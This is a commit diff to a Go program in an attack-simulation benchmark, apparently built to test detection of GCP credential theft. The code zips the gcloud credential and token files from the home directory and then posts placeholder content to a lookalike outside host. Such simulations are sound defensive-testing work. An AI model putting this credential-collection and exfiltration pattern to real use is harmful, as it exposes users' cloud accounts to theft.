38d659320fa3c46740e9a973f3888812c729275f
Thomas Stromberg <t+github@chainguard.dev>
2024-01-10 12:35:25 -0500

    Improve GCP credential theft simulation

--- cmd/creds-gcp-exfil/main.go
+++ cmd/creds-gcp-exfil/main.go
@@ -2,14 +2,65 @@
 package main
 
 import (
+	"archive/zip"
+	"io"
 	"log"
-
-	"github.com/tstromberg/ttp-bench/pkg/simulate"
+	"net/http"
+	"os"
+	"path/filepath"
+	"strings"
 )
 
 func main() {
-	if err := simulate.GCloudCredentialsTheft(); err != nil {
-		log.Fatalf("unexpected error: %v", err)
-
+	home, err := os.UserHomeDir()
+	if err != nil {
+		log.Printf("home dir: %v", err)
+		os.Exit(1)
 	}
+
+	tf, err := os.CreateTemp("/tmp", "ttp.*.zip")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer os.Remove(tf.Name())
+
+	z := zip.NewWriter(tf)
+
+	dir := filepath.Join(home, ".config/gcloud")
+	files := []string{
+		"application_default_credentials.json",
+		"access_tokens.db",
+		"credentials.db",
+	}
+
+	for _, f := range files {
+		path := filepath.Join(dir, f)
+		if _, err := os.Stat(path); err != nil {
+			continue
+		}
+
+		r, err := os.Open(path)
+		if err != nil {
+			log.Printf("failed to read %s: %v", path, err)
+			continue
+		}
+		defer r.Close()
+
+		w, err := z.Create(f)
+		if err != nil {
+			log.Printf("z.Create failed: %v", err)
+			continue
+		}
+		if _, err := io.Copy(w, r); err != nil {
+			log.Printf("failed to copy buffer: %v", err)
+			continue
+		}
+		log.Printf("%s archived", path)
+	}
+	z.Close()
+
+	// make outgoing connection
+	endpoint := "http://ueosntoae23958239.vkontake.ru/upload"
+	log.Printf("uploading fake content to %s", endpoint)
+	http.Post(endpoint, "image/jpeg", strings.NewReader("fake content"))
 }
